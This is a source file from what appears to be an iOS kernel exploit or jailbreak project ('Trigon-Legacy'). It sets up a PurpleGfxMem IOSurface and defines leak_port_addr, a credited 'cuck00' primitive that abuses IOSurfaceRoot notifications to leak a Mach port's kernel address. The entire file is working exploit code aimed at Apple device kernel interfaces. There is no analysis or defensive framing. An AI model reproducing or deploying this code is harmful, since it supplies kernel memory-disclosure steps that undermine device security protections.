// surface.m
// Trigon-Legacy, 2025

#include "surface.h"

static void* get_iosurface_symbol(const char* name) {
    static void *handle = NULL;
    if (!handle) {
        handle = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
        if (!handle) {
            ERR("Error: %s", dlerror());
            return NULL;
        }
    }
    void* sym = dlsym(handle, name);
    if (!sym) {
        ERR("Error: %s", dlerror());
        return NULL;
    }
    return sym;
}


// thanks staturnz oob_entry

CFNumberRef CFNUM(uint32_t value) {
    return CFNumberCreate(NULL, kCFNumberIntType, (void *)&value);
}

int (*IOMobileFramebufferOpen)(mach_port_t, mach_port_t, uint32_t, void *) = NULL;
int (*IOMobileFramebufferGetLayerDefaultSurface)(void *, int, void *) = NULL;

static ret_t init_io(void) {
    void *fb_handle = dlopen("/System/Library/Frameworks/IOMobileFramebuffer.framework/IOMobileFramebuffer", RTLD_NOW);
    if (fb_handle == NULL) {
        fb_handle = dlopen("/System/Library/PrivateFrameworks/IOMobileFramebuffer.framework/IOMobileFramebuffer", RTLD_NOW);
        if (fb_handle == NULL) return RET_ERR;
    }

    if ((IOMobileFramebufferOpen = dlsym(fb_handle, "IOMobileFramebufferOpen")) == NULL) { LOG("IOMobileFramebufferOpen not found"); return RET_ERR; }
    if ((IOMobileFramebufferGetLayerDefaultSurface = dlsym(fb_handle, "IOMobileFramebufferGetLayerDefaultSurface")) == NULL) { LOG("IOMobileFramebufferGetLayerDefaultSurface not found"); return RET_ERR; }
    return RET_SUCCESS;
}

IOSurfaceRef create_purplegfxmem_iosurface(void) {
    void *surface = NULL;
    ret_t ret = init_io();
    if (ret != RET_SUCCESS) {
        ERR("failed to init iomfb");
        return NULL;
    }
    if (dev_info->major == 7) {
        const char *list[] = {"AppleCLCD", "AppleM2CLCD", "AppleH1CLCD", "AppleMobileCLCD", NULL};
        mach_port_t service = MACH_PORT_NULL;
        void *client = MACH_PORT_NULL;

        for (uint32_t i = 0; list[i]; i++) {
            service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(list[i]));
            if (MACH_PORT_VALID(service)) break;
        }

        if (!MACH_PORT_VALID(service)) return NULL;
        IOMobileFramebufferOpen(service, mach_task_self(), 0, &client);
        IOObjectRelease(service);

        if (!client) return NULL;
        IOMobileFramebufferGetLayerDefaultSurface(client, 0, &surface);
        //IOServiceClose(client);

        if (!surface) return NULL;
    } else {
        CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(dict, CFSTR("IOSurfacePixelFormat"), CFNUM((int)'ARGB'));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceWidth"), CFNUM(32));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceHeight"), CFNUM(32));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceBufferTileMode"), kCFBooleanFalse);
        CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerRow"), CFNUM(128));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerElement"), CFNUM(4));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), CFNUM(0x20000));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceCacheMode"), CFNUM(0x100));
        // CFDictionarySetValue(dict, CFSTR("IOSurfaceMapCacheAttribute"), CFNUM(0x0));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    
        IOSurfaceRef (*createSurface)(CFMutableDictionaryRef) = get_iosurface_symbol("IOSurfaceCreate");
        if (!createSurface) {
            CFRelease(dict);
            return NULL;
        }

        surface = createSurface(dict);
        CFRelease(dict);
    }
    return surface;
}

void* get_base_address(IOSurfaceRef surface) {
    void* (*getBaseAddress)(IOSurfaceRef) = get_iosurface_symbol("IOSurfaceGetBaseAddress");
    if (!getBaseAddress) {
        return NULL;
    }
    return getBaseAddress(surface);
}

// cuck00 by siguza
uint64_t leak_port_addr(mach_port_t port, IOSurfaceRef surface)
{
    uint64_t result = 0;
    kern_return_t ret;
    task_t self = mach_task_self();
    io_service_t service = MACH_PORT_NULL;
    io_connect_t client  = MACH_PORT_NULL;
    uint64_t refs[8] = { 0x4141414141414141, 0x4242424242424242, 0x4343434343434343, 0x4545454545454545, 0x4646464646464646, 0x4747474747474747, 0x4848484848484848, 0x4949494949494949 };

    typedef uint32_t (*IOSurfaceGetIDPtr)(IOSurfaceRef surface);
    IOSurfaceGetIDPtr getID = (IOSurfaceGetIDPtr)get_iosurface_symbol("IOSurfaceGetID");
    
    typedef void (*IOSurfaceUseCountPtr)(IOSurfaceRef surface);
    IOSurfaceUseCountPtr incrementUseCount = (IOSurfaceUseCountPtr)get_iosurface_symbol("IOSurfaceIncrementUseCount");
    IOSurfaceUseCountPtr decrementUseCount = (IOSurfaceUseCountPtr)get_iosurface_symbol("IOSurfaceDecrementUseCount");
    
    if (!incrementUseCount || !decrementUseCount || !getID) {
        ERR("dlsym failed");
        goto out;
    }

    service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if(!MACH_PORT_VALID(service)) goto out;

    const uint32_t IOSURFACE_UC_TYPE =  0;
    ret = IOServiceOpen(service, self, IOSURFACE_UC_TYPE, &client);
    DEBUG("client: %x, %s", client, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(client)) goto out;
    
    uint32_t id = getID(surface);
    DEBUG("newSurface: %p, id: %u", surface, id);
    if(ret != KERN_SUCCESS) goto out;

    uint64_t in[3] = { 0, 0, 0 };
    const uint32_t IOSURFACE_SET_NOTIFY = 20;
    ret = IOConnectCallAsyncStructMethod(client, IOSURFACE_SET_NOTIFY, port, refs, 8, in, sizeof(in), NULL, NULL);
    DEBUG("setNotify: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    incrementUseCount(surface);
    DEBUG("incrementUseCount done");

    decrementUseCount(surface);
    DEBUG("decrementUseCount done");
    msg_t msg = { { 0 } };
    ret = mach_msg(&msg.head, MACH_RCV_MSG, 0, (mach_msg_size_t)sizeof(msg), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    DEBUG("mach_msg: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    result = msg.notify.ref[0] & ~3;

out:;
    IOSafeRelease(client);
    IOSafeRelease(service);
    return result;
}
